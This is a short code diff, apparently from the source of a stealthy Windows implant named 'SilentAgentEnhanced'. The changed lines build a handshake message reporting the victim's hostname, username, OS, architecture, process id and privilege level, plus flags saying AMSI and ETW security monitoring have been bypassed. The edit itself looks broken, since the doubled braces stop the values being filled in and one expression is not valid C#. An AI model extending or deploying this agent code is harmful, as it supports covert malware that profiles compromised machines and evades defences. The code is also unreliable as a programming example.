@@ -868,14 +868,14 @@ namespace SilentAgentEnhanced
             
             string handshake = $@"{{
                 ""type"": ""agent_handshake"",
-                "session_id": "" + SESSION_ID + "",
-                ""hostname"": ""{hostname}"",
-                ""username"": ""{username}"",
-                ""os"": ""{os}"",
-                ""arch"": ""{arch}"",
-                ""windows11"": {("10.0.2" in os).ToString().ToLower()},
-                ""pid"": {Process.GetCurrentProcess().Id},
-                ""integrity"": ""{GetIntegrityLevel()}"",
+                ""session_id"": ""{{SESSION_ID}}"",
+                ""hostname"": ""{{hostname}}"",
+                ""username"": ""{{username}}"",
+                ""os"": ""{{os}}"",
+                ""arch"": ""{{arch}}"",
+                ""windows11"": {{("10.0.2" in os).ToString().ToLower()}},
+                ""pid"": {{Process.GetCurrentProcess().Id}},
+                ""integrity"": ""{{GetIntegrityLevel()}}"",
                 ""bypass_status"": {{
                     ""amsi"": true,
                     ""etw"": true,
